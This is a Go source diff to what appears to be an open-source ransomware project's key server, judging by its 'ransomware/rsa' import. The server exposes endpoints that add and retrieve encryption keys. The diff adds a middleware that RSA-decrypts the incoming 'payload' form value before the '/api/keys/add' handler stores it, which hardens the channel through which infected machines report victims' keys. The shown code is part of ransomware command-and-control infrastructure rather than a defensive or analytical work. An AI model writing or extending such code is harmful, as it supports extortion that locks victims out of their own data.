@@ -9,6 +9,7 @@ import (
 	"github.com/labstack/echo/engine"
 	"github.com/labstack/echo/engine/standard"
 	"github.com/labstack/echo/middleware"
+	"github.com/mauri870/ransomware/rsa"
 )
 
 var (
@@ -44,7 +45,7 @@ func main() {
 	e.Use(middleware.Recover())
 
 	api := e.Group("/api", middleware.CORS())
-	api.POST("/keys/add", addKeys)
+	api.POST("/keys/add", addKeys, DecryptPayloadMiddleware)
 	api.GET("/keys/:id", getEncryptionKey)
 
 	log.Println("Listening on port 8080")
@@ -71,5 +72,25 @@ func CustomHTTPErrorHandler(err error, c echo.Context) {
 
 		// Otherwise return the normal response
 		c.String(httpError.Code, httpError.Message)
+	}
+}
+
+// DecryptPayloadMiddleware try to decrypt the payload from request
+func DecryptPayloadMiddleware(next echo.HandlerFunc) echo.HandlerFunc {
+	return func(c echo.Context) error {
+		// Retrieve the payload from request
+		payload := c.FormValue("payload")
+		if payload == "" {
+			return c.JSON(http.StatusUnprocessableEntity, ApiResponseNoPayload)
+		}
+
+		// Decrypt the payload
+		jsonPayload, err := rsa.Decrypt(PRIV_KEY, []byte(payload))
+		if err != nil {
+			return c.JSON(http.StatusUnprocessableEntity, ApiResponseBadRSAEncryption)
+		}
+
+		c.Set("payload", jsonPayload)
+		return next(c)
 	}
 }
